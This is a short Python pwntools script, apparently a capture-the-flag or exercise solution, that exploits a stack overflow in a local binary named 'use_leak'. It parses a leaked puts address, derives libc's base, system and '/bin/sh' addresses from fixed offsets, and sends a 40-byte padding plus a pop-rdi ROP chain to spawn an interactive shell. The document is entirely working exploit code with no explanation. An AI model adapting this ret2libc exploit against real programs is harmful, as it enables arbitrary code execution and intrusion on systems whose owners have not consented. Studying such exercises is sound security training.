#!/usr/bin/python
from pwn import *

PUTS_OFFSET   = 0x06f690
SYSTEM_OFFSET = 0x045390
BIN_SH_OFFSET = 0x18cd17

p = process("./use_leak")
p.readuntil("yours? ")
puts_leak = int(p.readline(), 16)
libc_base_address = puts_leak - PUTS_OFFSET
system_address    = libc_base_address + SYSTEM_OFFSET
bin_sh_address    = libc_base_address + BIN_SH_OFFSET

log.info("leaked puts address: 0x{:>8x}".format(puts_leak))
log.info("found libc base address: 0x{:>8x}".format(libc_base_address))
log.info("found system address: 0x{:>8x}".format(system_address))
log.info("found \"/bin/sh\" address: 0x{:>8x}".format(bin_sh_address))

rop = "A" * 40
# 0x0000000000400683 : pop rdi ; ret
rop += p64(0x400683) + p64(bin_sh_address)
rop += p64(system_address)

p.sendline(rop) 
p.interactive()
